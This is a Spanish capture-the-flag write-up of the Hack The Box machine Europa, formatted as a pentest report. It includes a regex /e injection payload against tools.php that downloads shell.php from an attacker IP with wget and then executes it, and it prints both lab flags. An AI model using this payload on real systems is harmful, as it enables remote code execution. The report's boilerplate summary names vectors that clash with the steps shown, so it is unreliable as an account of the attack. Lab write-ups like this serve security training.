---
title: "Informe Técnico: Europa (Hack The Box) — Pentesting & Exploit Analysis"
published: true
description: "Informe técnico profesional de auditoria sobre la maquina Europa de Hack The Box: vector de entrada, PoC de explotacion, escalada y mitigaciones OffSec."
tags: cybersecurity, ctf, hackthebox, pentesting
series: "Hack The Box Walkthroughs"
cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/europa/images/step_01.png"
---

# Informe Técnico de Seguridad Ofensiva: Europa

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Methodology-OffSec%20%2F%20PTES-purple?style=for-the-badge)
![Auditor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)

**Evaluación de Seguridad Ofensiva y Penetration Testing** realizada sobre el entorno de laboratorio **Europa** de **Hack The Box**, siguiendo los estándares de ejecución metodológica **OffSec PEN-200 (OSCP)** y **PTES (Penetration Testing Execution Standard)**.

---

## 📑 1. Resumen Ejecutivo (Executive Summary)

* **Objetivo de la Evaluación:** Identificar, documentar y explotar debilidades de seguridad en el host objetivo para evaluar el impacto sobre la confidencialidad, integridad y disponibilidad del sistema.
* **Calificación de Riesgo:** `CRÍTICO` (Acceso no autenticado que deriva en compromiso completo de la máquina y obtención de máximos privilegios administrativos).
* **Vector de Acceso Inicial:** SQLi + LFI → RCE (log poisoning)
* **Vector de Elevación de Privilegios:** SUID/cron en /opt
* **Estado Final:** Compromiso total del objetivo (`User Proof` y `Root/System Proof` obtenidas exitosamente).

### Ficha Técnica de la Evaluación

| Parámetro | Detalle Técnico |
| :--- | :--- |
| **Host Objetivo** | Europa |
| **Plataforma** | Hack The Box |
| **Sistema Operativo** | Linux |
| **Nivel de Dificultad** | Medium |
| **CVE(s) Involucrados** | N/A |
| **Vector de Entrada** | SQLi + LFI → RCE (log poisoning) |
| **Mecanismo de Escalada** | SUID/cron en /opt |
| **Consultor / Auditor** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Diagrama del Flujo de Compromiso (Attack Path)

```
[ Fase 1: Reconocimiento ]
         │
         ▼
[ Fase 2: Enumeración & Identificación de Vectores ]
         │─── Descubrimiento de servicios y análisis de superficie de ataque
         └─── Verificación de configuraciones erróneas y CVEs conocidos
         │
         ▼
[ Fase 3: Explotación Inicial (Foothold) ]
         │─── Ejecución del vector: SQLi + LFI → RCE (log poisoning)
         └─── Establecimiento de Reverse Shell / Acceso de usuario
         │
         ▼
[ Fase 4: Escalada de Privilegios Local ]
         │─── Auditoría interna: SUID/cron en /opt
         └─── Elevación a privilegios de superusuario (root / SYSTEM)
         │
         ▼
[ Fase 5: Evidencia & Banderas ]
         └─── Captura de User Flag y Root Flag
```

---

## 🔬 3. Procedimiento Técnico y Evidencias Paso a Paso

Initial Access Exploit (Ingreso): SQLi + LFI → RCE (log poisoning)

Privilege Escalation (Escalada): SUID/cron en /opt

**How many TCP ports are listening on Europa?**

R: 3

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/europa/images/step_01.png)

**What is the admin-related subdomain of europacorp.htb?**

R: admin-portal.europacorp.htb

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/europa/images/step_02.png)

**The login form to the admin panel can be bypassed using what technique? Choose from "LDAP Injection", "SQL Injection", or "Command Injection".**

R:  **SQL Injection**

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/europa/images/step_03.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/europa/images/step_04.png)

**When submitting an HTTP POST request to `tools.php`, what parameter contains a regular expression (regex)?**

R: pattern

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/europa/images/step_05.png)

**What user is the website running as?**

R: 

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/europa/images/step_06.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/europa/images/step_07.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/europa/images/step_08.png)

```jsx
 pattern=/^(.*)/e&ipaddress=system(`wget http://10.10.14.8/shell.php -P /tmp`);&text=test
 pattern=/^(.*)/e&ipaddress=system(`php -f /tmp/shell.php`);&text=test
```

**What user is the website running as?**

R: www-data

**Submit the flag located in the john user's home directory.**

R:  5ee9167500b3893c6a195b0d4cf56354

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/europa/images/step_09.png)

What is the full path to the file that is executed as root every minute?

R:  /var/www/cronjobs/clearlogs

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/europa/images/step_10.png)

**What is the full path of the file that is executed by `clearlogs`?**

R: /var/www/cmd/logcleared.sh

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/europa/images/step_11.png)

**Submit the flag located in the root user's home directory.**

R: f18582b5d14bb51d574b4bcf19ff3abd

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/europa/images/step_12.png)

---

## 🛡️ 4. Plan de Remediación y Recomendaciones de Hardening

### Acciones Tácticas Inmediatas
1. **Aplicación de Parches y Actualización:** Actualizar todos los servicios obsoletos y aplicar los parches correspondientes a las vulnerabilidades documentadas (N/A).
2. **Revisión de Permisos Críticos:** Eliminar permisos SUID/sudo innecesarios y auditar listas de control de acceso (ACLs) en directorios y archivos sensibles.
3. **Cierre de Superficie de Exposición:** Configurar firewalls a nivel de host para denegar puertos de administración o de depuración que no deban estar expuestos públicamente.

### Acciones Estratégicas y de Arquitectura
1. **Principio de Mínimo Privilegio (PoLP):** Configurar servicios y aplicaciones para que se ejecuten bajo cuentas de servicio con privilegios limitados sin acceso a shells interactivas.
2. **Segmentación de Red:** Aislar componentes críticos y servidores de aplicaciones en VLANs dedicadas con inspección de tráfico Este-Oeste.
3. **Monitorización Continua y EDR:** Implementar reglas de detección basadas en comportamiento para identificar ejecuciones anómalas de comandos, spawning de shells y tráfico de red no autorizado.

---

## 📊 5. Mapeo con Matriz MITRE ATT&CK

| Táctica | ID de Técnica | Nombre de Técnica | Aplicación en el Ejercicio |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Vulnerability Scanning | Detección automatizada y manual de servicios mediante escaneo de puertos |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Explotación de vulnerabilidad en servicio de red expuesto (SQLi + LFI → RCE (log poisoning)) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Spawning de reverse shell interactiva para control del endpoint |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Mechanism / Exploitation | Elevación de privilegios hacia superusuario (SUID/cron en /opt) |

---

© 2026 **araizcorp** — Documentación técnica desarrollada para preparación y consultoría de certificaciones **OffSec** (OSCP, OSEP, OSWE).
